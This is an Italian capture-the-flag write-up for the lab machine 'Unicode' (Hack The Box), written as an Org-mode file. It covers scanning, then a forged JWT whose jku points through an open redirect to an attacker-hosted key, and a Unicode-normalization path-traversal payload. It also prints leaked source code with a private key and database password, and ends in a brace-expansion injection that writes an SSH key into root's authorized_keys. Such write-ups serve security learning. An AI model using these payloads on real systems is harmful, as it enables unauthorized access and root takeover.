@@ -1,0 +1,709 @@
+#+TITLE: HTB - Unicode
+#+AUTHOR: Leonardo Tamiano
+
+* Enumeration
+** nmap 
+*** nmap -sC -sV unicode
+  #+begin_example
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 03:51 CEST
+Nmap scan report for unicode (10.129.75.133)
+Host is up (0.12s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
+|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
+|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-generator: Hugo 0.83.1
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Hackmedia
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.90 seconds
+
+  #+end_example
+
+*** nmap -p- unicode
+    #+begin_example
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 03:52 CEST
+Host is up (0.12s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 2445.44 seconds    
+    #+end_example
+
+** www (80)
+*** redirect
+    Effettuando una GET all'endpoint ~/redirect/?url=google.com~ il web
+    server ci invia la seguente risposta
+    
+    #+begin_example
+HTTP/1.1 302 FOUND
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sun, 24 Jul 2022 02:02:16 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 240
+Connection: close
+Location: http://google.com
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="http://google.com">http://google.com</a>. If not click the link.    
+    #+end_example
+
+    Da notare il campo ~Location~, che è uguale al valore di google.com
+    inserito nell'URL iniziale come valore del parametro ~url~.
+
+*** Utilizzo JWT (Json Web Token)
+    Il cookie generato dall'applicazione flask è un JWT (Json Web Token)
+
+    #+begin_example
+Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoibGVvIn0.ZMC1zUK2npFOCFsgg2i4xqusi_XHxXzckb4-QeOaRxt_myvZn6r7RoNfHZxd8qbPPehCUHzN8AsFL7mdh2FoyWGBoS2o4lFJRF7jZ4cRqSy3F96V99XVzNI3JiMqOVaokHGx8I-qNC0mz6_X_sYeLD6GbPHDG1n8B0K7d9jNmz8j2dbyOgea9cIMUEoGlGiMI_EqjfzghlL8BVpjgUlPuB5TI9-Uo6HEOs1Gc3oRSV0sGHG-Dlmtf3B9UinqcYyR85vjO348zG6Exss7mEk4ANuwxJ4bRyist7ktj6-pQgFFCSwvzvwd7bdJUYlaoYP497mASGs8yQxGHplH7gM_Zw    
+    #+end_example
+ 
+    Andandolo ad analizzare con https://jwt.io/ otteniamo le tre parti
+    del cookie:
+
+    - header
+      
+      #+begin_src js
+{
+  "typ": "JWT",
+  "alg": "RS256",
+  "jku": "http://hackmedia.htb/static/jwks.json"
+}          
+      #+end_src
+    
+    - payload
+
+      #+begin_src js
+{
+  "user": "leo"
+}      
+      #+end_src
+
+    - signature
+      
+      #+begin_example
+ZMC1zUK2npFOCFsgg2i4xqusi_XHxXzckb4-QeOaRxt_myvZn6r7RoNfHZxd8qbPPehCUHzN8AsFL7mdh2FoyWGBoS2o4lFJRF7jZ4cRqSy3F96V99XVzNI3JiMqOVaokHGx8I-qNC0mz6_X_sYeLD6GbPHDG1n8B0K7d9jNmz8j2dbyOgea9cIMUEoGlGiMI_EqjfzghlL8BVpjgUlPuB5TI9-Uo6HEOs1Gc3oRSV0sGHG-Dlmtf3B9UinqcYyR85vjO348zG6Exss7mEk4ANuwxJ4bRyist7ktj6-pQgFFCSwvzvwd7bdJUYlaoYP497mASGs8yQxGHplH7gM_Zw      
+      #+end_example
+
+   Da notare il valore ~jku~ nel campo header, che punta ad un URI che
+   contiene una chiave pubblica RSA in formato JSON. Mettendo
+   l'hostname ~hackmedia.htb~ nel file ~/etc/hosts~ e andando all'url
+   ~http://hackmedia.htb/static/jwks.json~ otteniamo
+   
+   #+begin_src js
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "use": "sig",
+            "kid": "hackthebox",
+            "alg": "RS256",
+            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
+            "e": "AQAB"
+        }
+    ]
+}   
+   #+end_src
+
+   Che è proprio una chiave RSA codificata in formato JSON.
+
+*** Generazione JWT 
+    Prima genero chiave rsa con ~ssh-keygen~
+    
+    #+begin_src sh
+ssh-keygen -t rsa -N "" -m PEM -f key    
+    #+end_src
+
+    E poi utilizzo la libreria python ~jwt~
+    
+    #+begin_src sh
+pip install jwt    
+    #+end_src
+
+    il codice python è il seguente
+    
+    #+begin_src python
+#!/usr/bin/env python3
+
+import jwt
+
+if __name__ == "__main__":
+    private_key = open("key").read().encode()
+    token = jwt.encode({"user": "admin"},
+                       private_key,
+                       headers={"jku": "http://hackmedia.htb/static/../redirect/?url=10.10.14.28:1337/jwks.json"},
+                       algorithm="RS256")
+    print(token)
+    
+    #+end_src
+
+    Da notare il particolare URL messo al posto di ~jku~
+    
+    #+begin_example
+    http://hackmedia.htb/static/../redirect/?url=10.10.14.28:1337/jwks.json
+    #+end_example
+
+    l'URL permette di effettuare una SSRF
+    (Server-Side-Request-Forgery) nel contesto della validazione del
+    token JWT. In particolare ci permette di forzare il server ad
+    utilizzare delle specifiche chiavi publiche per verificare la
+    firma del token.
+
+    Abbiamo dovuto utilizzare il trucco del ~/redirect~ perché senza il
+    server dava un msg di errore validazione jku. 
+
+    -----------------------------
+
+    A questo punto scriviamo il file corretto ~jwks.json~ che contiene
+    la chiave pubblica in formato jwt. Prima generiamo la chiave
+    pubblica in formato PEM.
+    
+    #+begin_src sh
+openssl rsa -in key -pubout > key.pub    
+    #+end_src
+
+    Poi utilizziamo il seguente sito
+    https://irrte.ch/jwt-js-decode/pem2jwk.html per ottenere il file
+    ~jwks.json~
+    
+    #+begin_src js
+{
+    "kty": "RSA",
+    "n": "2WeExR7HbQbr2AU3FxzrM3IxRg6mifCd6Fvy6tdHo_BQkoMbbvHYWUmpHSa2bayLLdFA0o-TbXxJ4VPyYiHkga3mhiEp8YKMuqGc68G4JTMrYYfmCoxi7vG3KY_-fofvJ-nSP_vss2B2JmV5E-b6hm8HyEdGQ6nAeOCqNKaNQI0xdYna12IIzmbKC-StKchvJOiXqdkKyIPwXGL_f8ifnfUzuW6gWiFqYp2fBexGxmJvVG2OUpvkF7Sk-MFyTMokk6cYDg9FakX2pLCLkToUVRWv9EJNSS25CoRaK4m52Ly2QB9Q8TI4cDdzWp7Kektebr07iRzr5D3ASn18q4FeWGJiXyU4vmvkfINYUijpZ4v93T6neKHGnOYGpDe4_u5C2MQSwQUk3oqOnAAH4NzrMrlzHaJklZETD_SUeu0rTDMI9yqbURBMpbgqySUkZZv9v3cjApQcZHpUB57zFIjPuLDqwqlj9OXqjs8BENu2vVoYjrzp2QHD2vrVHPpoYpSP",
+    "e": "AQAB"
+}    
+    #+end_src
+
+*** Unicode Normalization per LFI
+    Dopo aver generato il cookie JWT valido, siamo entrati in un'altra
+    sezione della web app. In particolare c'era il seguente URL
+
+    #+begin_example
+http://unicode/display/?page=monthly.pdf
+    #+end_example
+
+    Per ottenere una LFI è stato necessario utilizzare un tipico
+    payload che attacca la ~unicode normalization~
+    
+    https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability
+    
+    In particolare il payload è il seguente
+    
+    #+begin_example
+http://unicode/display/?page=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f/etc/passwd
+    #+end_example
+
+    ------------------------------------
+
+    Il seguente codice python permette di capire il perché della
+    vulnerabilità
+    
+    #+begin_src python
+import unicodedata
+
+# page="../"
+page="..／"
+
+print(page)
+
+if "../" in page:
+    print("ERROR!")
+    exit()
+    
+safe_page=unicodedata.normalize('NFKC', page)
+print(safe_page)    
+    #+end_src
+
+*** app.py
+    Codice dell'applicazione presa dopo aver ottenuto la shell da user ~code~.
+    
+    #+begin_src python
+import base64
+from MySQLdb import cursors
+from flask import Flask, abort, request,render_template,make_response,redirect
+from werkzeug.utils import secure_filename
+import unicodedata
+import os
+import jwt
+from flask_mysqldb import MySQL
+import yaml
+import requests
+import json
+import traceback
+app = Flask(__name__)
+
+db=yaml.load(open('db.yaml'))
+app.config['MYSQL_HOST']= db['mysql_host']
+app.config['MYSQL_USER']=db['mysql_user']
+app.config['MYSQL_PASSWORD']=db['mysql_password']
+app.config['MYSQL_DB']=db['mysql_db']
+app.debug=True
+
+mysql=MySQL(app)
+
+@app.route('/')
+def Welcome_name():
+  return render_template("index.html")
+@app.route('/register/',methods=['GET','POST'])
+def register():
+  if request.method=="GET":
+    return render_template('register.html')
+  if request.method=="POST":
+    username=request.form.get('username')
+    username=username.lower()
+    if request.form.get('password')==request.form.get('password_confirm'):
+      password=request.form.get('password')
+      cur=mysql.connection.cursor()
+      cur.execute("select username from user_info where username=%s",[username])
+      data=cur.fetchall()
+      cur.close()
+      if len(data)==0:
+        cur=mysql.connection.cursor()
+        cur.execute("insert into user_info(username,password) values(%s,%s)",(username,password))
+        mysql.connection.commit()
+        cur.close()
+        return redirect("/login",code=302)
+      else:
+        msg="User alreay exist"
+        return render_template("register.html",msg=msg)
+    else:
+      msg="PASSOWRD DOSENT MATCH"
+      return render_template('register.html',msg=msg)
+@app.route('/login/',methods=['GET','POST'])
+def login():
+  if request.method=="GET":
+    if request.cookies.get('auth'):
+      return redirect("/dashboard/")
+    else:
+      return render_template('login.html')
+  if request.method=="POST":
+    priv=b'-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAxVwY8XrYwD+WcKU3hnpY0Jdkds9iv52GSK4TaQFoQ9hhyVEU\nNrbhr4CpVjlFHY2KwQ/bnB0eoeYaGbdN17bEUoXOLNVPHFM7LQ62gfT1Ia7KX+4V\nkjS9Awtcm0dm7L9hFaHFNLOndtN4VkEcLduO75TGIlk09Crc8wwLyhMpCzmj5uOd\ngaLe2ZODMmtNsWRAkqW1YLxciFzkwBZQZygjir0NSc+P+rOwOMwEahbU3lC2dT3W\nO6u9r1Ilw3SNvtpija+U/UlO6s0G3AEwFT30LJdnmJEksTHGBQ2wMEX8OzAmg7Gz\nsIBULkWMiqFvW1FPLdp8xayYarDweJQDZYVhywIDAQABAoIBABbQhrGjmdrffuyW\nrMyG6C100tBJOQkdlKBiPywsVXlCUkuLa+LHUV+QaALnq+22pwuaYbCyTRA6IVpH\nrl/5aMiBX0wffH2xwW17/e0X/B5grlRYmXXFUvQ/I/1vS56ioP53LOzit8EswQR3\nkmJatzNK53yhA1YWfmQ6SEKb5Gq/ksMG3T5BHi0GWkR7YmbfvqgcNTlWgmlKj3qp\n5JQWpaWea4tEtdoV06kciE8ugs4R0Tzd4NbjXGJiidoMY/mvcm7Ln425cYEJj+44\naGmOnoFLSNJaVk6mYWzXpOLZAjPDSROI+mYj1gRR9PROnvHVZWKsogBl+DMCq46h\n/GIqNwECgYEA+s7d17mrDFuo0qQfr8AP/ThVujwvmcBCtQsI/a0DrSHFRV1c9zK9\nTeKZ/0FqOFnNr4a+F7LKYT9PpsbOClJbNP7nLJXE64vQLQVB/IbkJ6bDw63LZRvX\nPFp3xr3ltMrQ+bjEkt3IHF0ae20II5W3mjaEPG7Gd/Gnpi61NF53LhECgYEAyXH8\nkoQr2IB3jduwN2mNYrc1Twb1QDhj9a4/W/yIsgIbJ4/8sjuJyehvm1Xb2f9axY6Q\nCpse4piYYnKSk3AqbSThVW+X4LgXlKR0Xe5Zhsf/F2072+822h1wRyqKR4xM5kbv\n5ruH9ZTi2K0Fll3rGhDzJ0ygoe0uGmWG2bNNJhsCgYEAqDjaORhSbt6HtIjaq/Hh\nh5EihuBZeQGofG/jXuqN3bEZ9LVzZmZE7JmBeuCwUw2A1StGEvUbovBpB06u4eNt\nQ3V5LsFhrC9BuQCeyrbbDvFeur+1/aIX0mZHkijKimHCmsxgJLXWw5d67LAr1lpU\nJH5OYY5XVhnivab0aSS3QVECgYAVZX8PTOyfTV3lem0oJZT35D/MSg/op1SutrhS\nG+ulBKY/uIJ9p+dFw+N+20rDx+SrUS4pgjpwlQayhjrdYC+RcjZg7b5zBvqyNhmK\nFJP7xehpY5fVD36DAld3p6QSX2uXlfdLSaXyRsMlgpMyWn1rQluhU/lH2bpo4VnG\na84I+wKBgQDKy7HGzCp6CXbiEUOlitZhST8eq8Dwk+bh9HGMMvrPCMPWBibshwl4\nDFi8Mol0XoiLgrc8fCu7/8wz0ctD+5R63rHG6/vZLsZEW2JsoWP/b/wCdXu/jdXU\nNWpjmc9EgSTEbqhKSSHoXt/Q3HKi770ps7Ajd4O50yu99GLZZ4kVHA==\n-----END RSA PRIVATE KEY-----\n'
+    username=request.form.get('username').lower()
+    password=request.form.get('password')
+    if username=="admin":
+      msg="Acces to admin account is been blocked"
+      return render_template("login.html",msg=msg)
+    else:
+      cur=mysql.connection.cursor()
+      cur.execute("select username,password from user_info where username=%s and password=%s",(username,password))
+      data=cur.fetchall()
+      if len(data)!=0:
+        creds=data[0]
+        if username==creds[0] and password==creds[1]:
+          token=jwt.encode({"user": username}, priv, algorithm="RS256",headers={"jku":"http://hackmedia.htb/static/jwks.json"},)
+          resp=make_response(redirect('/dashboard/'))
+          resp.set_cookie('auth', token)
+          return resp
+      else:
+        msg="user doesnt exist"
+        return render_template("login.html",msg=msg)
+@app.route("/logout/")
+def logout():
+  resp=make_response(redirect('/login/'))
+  resp.set_cookie('auth','',expires=0)
+  return resp
+@app.route("/dashboard/",methods=["GET","POST"])
+def dashboard():
+  if request.cookies.get('auth'):
+    auth_cookie=request.cookies.get('auth')
+    try:
+      token_head=auth_cookie.split(".")[0]
+      if len(token_head)%4!=0:
+        no_equal_adder=4-len(auth_cookie.split(".")[0])%4
+        equal_adder=no_equal_adder*"="  
+        token_head=token_head+equal_adder
+      decoded_token=base64.urlsafe_b64decode(token_head).decode('utf-8')
+      url=decoded_token.split('"jku"')[1].lstrip(":").rstrip("}").strip('"')
+      if '"' in url:
+        url=url.replace('"',"")
+      url=url.strip('\n')
+      url=url.strip()
+      print(len(url))
+      if url.startswith("http://hackmedia.htb/static/"):
+        resp=requests.get(url)
+        data=json.loads(resp.text)
+        jwk=data["keys"][0]
+        key=jwt.algorithms.RSAAlgorithm.from_jwk(json.dumps(jwk))
+        decoded_token=jwt.decode(auth_cookie, key , algorithms=["RS256"])
+      else:
+        return "jku validation failed"
+    except:
+      return render_template("login.html")
+    if decoded_token['user']=="admin":
+      return render_template("admin_dashboard.html")
+    else:
+      return render_template("user_dashboard.html",username_send=decoded_token['user'])
+  else:
+    return render_template("login.html")
+@app.route('/display/',methods=['GET'])
+def display():
+  if request.cookies.get('auth'):
+    auth_cookie=request.cookies.get('auth')
+    admin_check=""
+    try:
+      token_head=auth_cookie.split(".")[0]
+      if len(token_head)%4!=0:
+        no_equal_adder=4-len(auth_cookie.split(".")[0])%4
+        equal_adder=no_equal_adder*"="  
+        token_head=token_head+equal_adder
+      decoded_token=base64.urlsafe_b64decode(token_head).decode('utf-8')
+      url=decoded_token.split('"jku"')[1].lstrip(":").rstrip("}").strip('"')
+      if '"' in url:
+        url=url.replace('"',"")
+      url=url.strip('\n')
+      url=url.strip()
+      if url.startswith("http://hackmedia.htb/static/"):
+        resp=requests.get(url)
+        data=json.loads(resp.text)
+        jwk=data["keys"][0]
+        key=jwt.algorithms.RSAAlgorithm.from_jwk(json.dumps(jwk))
+        admin_check=jwt.decode(auth_cookie, key , algorithms=["RS256"])
+      else:
+        return "JKU validation Falied"
+    except:
+      return redirect('login')
+    if admin_check['user']=="admin":
+      if request.args.get('page'):
+        page=request.args.get('page')
+        page=page.lower()
+        file_to_send=""
+        if "../" in page or page.startswith("/etc") or page.startswith("/proc") or page.startswith("/usr") or page.startswith("usr") or page.startswith("etc") or page.startswith("proc"):
+          return redirect("/filenotfound/",code=302)
+        else:
+            safe_page=unicodedata.normalize('NFKC', page)
+            safe_page_folder=os.getcwd()+"/"+"files/"+safe_page
+            try:
+              with open(safe_page_folder,"r") as fd:
+                  file_to_send=fd.readlines()
+              file_to_send_string=''.join([str(elem) for elem in file_to_send])
+              return str(file_to_send_string)
+            except:
+              msg=safe_page+" Not found"
+              return render_template("404.html",msg=msg)
+      else:
+        return "Missing Parameter"
+    else:
+      return redirect("/unauth_error/",code=302)
+  else:
+    return redirect("/unauth_error/",code=302)
+@app.route("/redirect/",methods=["GET"])
+def test():
+  url="http://"+request.args.get("url")
+  return redirect(url,code=302)
+@app.route("/upload/",methods=["GET","POST"])
+def file_upload():
+  try:
+    if request.method=="GET":
+      if request.cookies.get('auth'):
+        return render_template("upload.html")
+    if request.method=="POST":
+      allowed_files=["pdf","docx","php","py","asp"]
+      f = request.files['threat_report']
+      user_supplied_extension=f.filename.rsplit('.',1)
+      if user_supplied_extension[1] in allowed_files:
+        return render_template("thanks.html")
+      else:
+        return "file not allowed"
+  except:
+    return "Please select a file to upload."
+@app.route("/debug/")
+def debug():
+  debug_value=request.args.get("value")
+  if debug_value==0:
+    return "debug is disabled"
+  else:
+    return render_template("debug.html")
+@app.route("/pricing/")
+def pricing():
+  return render_template("pricing.html")
+@app.route("/checkout/")
+def checkout():
+  return render_template("checkout.html")
+@app.route("/purchase_done/")
+def purchase():
+  return render_template("thanks_purchase.html")
+@app.route('/error/',methods=["GET"])
+def error():
+  return render_template("404.html")
+@app.route("/filenotfound/")
+def error_from_page():
+  msg="we do a lot input filtering you can never bypass our filters.Have a good day"
+  return render_template("404.html",msg=msg)
+@app.route("/unauth_error/",methods=["GET"])
+def unauth():
+  msg="unauthorized access"
+  return render_template("401.html",msg=msg)
+@app.route("/rate-limited/")
+def rate_limited():
+  return render_template("503.html")
+@app.errorhandler(404)
+def not_found(e):
+  return render_template("404.html")
+@app.route("/internal/")
+def internal_error():
+  #return "500 error caught"
+  return traceback.format_exc()
+if __name__ == "__main__":
+    app.run(host='0.0.0.0')    
+    #+end_src
+
+** gobuster
+*** gobuster dir -w ~/repos/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://unicode --exclude-length 9294,9343
+    #+begin_example
+/login                (Status: 308) [Size: 248] [--> http://unicode/login/]
+/register             (Status: 308) [Size: 254] [--> http://unicode/register/]
+/upload               (Status: 308) [Size: 250] [--> http://unicode/upload/]  
+/redirect             (Status: 308) [Size: 254] [--> http://unicode/redirect/]
+/display              (Status: 308) [Size: 252] [--> http://unicode/display/] 
+/pricing              (Status: 308) [Size: 252] [--> http://unicode/pricing/]
+
+/upload               (Status: 308) [Size: 250] [--> http://unicode/upload/]
+/display              (Status: 308) [Size: 252] [--> http://unicode/display/]
+/logout               (Status: 308) [Size: 250] [--> http://unicode/logout/] 
+/checkout             (Status: 308) [Size: 254] [--> http://unicode/checkout/
+    #+end_example
+
+* PrivEsc
+** files
+*** /etc/passwd
+    #+begin_example
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
+code:x:1000:1000:,,,:/home/code:/bin/bash   
+    #+end_example
+
+*** /etc/nginx/sites-available/default
+    #+begin_example
+limit_req_zone $binary_remote_addr zone=mylimit:10m rate=800r/s;
+server{
+#Change the Webroot from /home/code/app/ to /var/www/html/
+#change the user password from db.yaml
+	listen 80;
+	error_page 503 /rate-limited/;
+	location / {
+                limit_req zone=mylimit;
+		proxy_pass http://localhost:8000;
+		include /etc/nginx/proxy_params;
+		proxy_redirect off;
+	}
+	location /static/{
+		alias /home/code/coder/static/styles/;
+	}
+}    
+    #+end_example
+
+*** /home/code/coder/db.yaml
+    #+begin_example
+
+mysql_host: "localhost"
+mysql_user: "code"
+mysql_password: "B3stC0d3r2021@@!"
+mysql_db: "user"
+    
+    #+end_example
+** as code
+*** sudo -l
+    #+begin_example
+code@code:~$ sudo -l
+Matching Defaults entries for code on code:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User code may run the following commands on code:
+    (root) NOPASSWD: /usr/bin/treport    
+    #+end_example
+** python binary decompilation
+   Come l'utente ~code~ siamo in grado di eseguire da root il seguente
+   binario ~/usr/bin/treport~.
+
+   Andando a vedere tramite strings otteniamo la stringa ~pydata~, il
+   che ci suggerisce che il binario è stato ottenuto andando a
+   compilare del codice python.
+
+   L'idea quindi è quella di fare del ~reverse engineering~, per passare
+   dal compilato al codice sorgente originale. A tale fine i seguenti
+   due tool saranno necessari:
+
+   - Per passare da binario a byte-code python utilizzeremo
+     ~pyinstxtractor~.
+
+     https://github.com/extremecoders-re/pyinstxtractor
+
+   - Per passare da byte code python a codice sorgente python invece
+     utilizzeremo ~pycdc~.
+
+     https://github.com/zrax/pycdc
+
+     Per compilare il progetto devo fare
+     
+     #+begin_src sh
+git clone https://github.com/zrax/pycdc
+cd pycdc
+cmake CMakeLists.txt
+make
+     #+end_src
+
+   Il processo è quindi così descritto:
+   
+   #+begin_example
+   ELF binary ---> byte-code python ---> codice sorgente python   
+   #+end_example
+
+   tramite i seguenti comandi
+   
+   #+begin_src sh
+
+cd pyinstxtractor
+python3 pyinstxtractor.py ../treport
+
+cd ../pycdc
+./pycdc ../pyinstxtractor/treport_extracted/treport.pyc -o treport.py
+   #+end_src
+
+   Alla fine ottengo il seguente codice sorgente python
+   
+   #+begin_src python
+# Source Generated with Decompyle++
+# File: treport.pyc (Python 3.9)
+
+import os
+import sys
+from datetime import datetime
+import re
+
+class threat_report:
+    
+    def create(self):
+        file_name = input('Enter the filename:')
+        content = input('Enter the report:')
+        if '../' in file_name:
+            print('NOT ALLOWED')
+            sys.exit(0)
+        file_path = '/root/reports/' + file_name
+    # WARNING: Decompyle incomplete
+
+    
+    def list_files(self):
+        file_list = os.listdir('/root/reports/')
+        files_in_dir = ' '.join((lambda .0: [ str(elem) for elem in .0 ])(file_list))
+        print('ALL THE THREAT REPORTS:')
+        print(files_in_dir)
+
+    
+    def read_file(self):
+        file_name = input('\nEnter the filename:')
+        if '../' in file_name:
+            print('NOT ALLOWED')
+            sys.exit(0)
+        contents = ''
+        file_name = '/root/reports/' + file_name
+    # WARNING: Decompyle incomplete
+
+    
+    def download(self):
+        now = datetime.now()
+        current_time = now.strftime('%H_%M_%S')
+        command_injection_list = [
+            '$',
+            '`',
+            ';',
+            '&',
+            '|',
+            '||',
+            '>',
+            '<',
+            '?',
+            "'",
+            '@',
+            '#',
+            '$',
+            '%',
+            '^',
+            '(',
+            ')']
+        ip = input('Enter the IP/file_name:')
+        res = bool(re.search('\\s', ip))
+        if res:
+            print('INVALID IP')
+            sys.exit(0)
+        if 'file' in ip and 'gopher' in ip or 'mysql' in ip:
+            print('INVALID URL')
+            sys.exit(0)
+        cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
+        os.system(cmd)
+
+
+# WARNING: Decompyle incomplete
+   
+   #+end_src
+
+** to get root
+   L'idea è quella di utilizzare la ~brace expansion~ di bash per
+   iniettare il seguente payload nella sezione download del binario
+   ~treport~
+   
+   #+begin_example
+code@code:/tmp$ sudo /usr/bin/treport
+1.Create Threat Report.
+2.Read Threat Report.
+3.Download A Threat Report.
+4.Quit.
+Enter your choice:3
+Enter the IP/file_name:{FILE:///tmp/prova,-o,/root/.ssh/authorized_keys}
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   562  100   562    0     0   548k      0 --:--:-- --:--:-- --:--:--  548k
+Enter your choice:
+   
+   #+end_example
+
+   dove ~/tmp/prova~ conteneva una chiave pubblica generata tramite
+   ~ssh-keygen~ e trasportata nella macchina remota.
+
+* Flags
+  - *user*: a2eaef3add50c11c0e774a1fab550d40
+  - *root*: f26a3e5ef69b61ecda1035562b4570d5
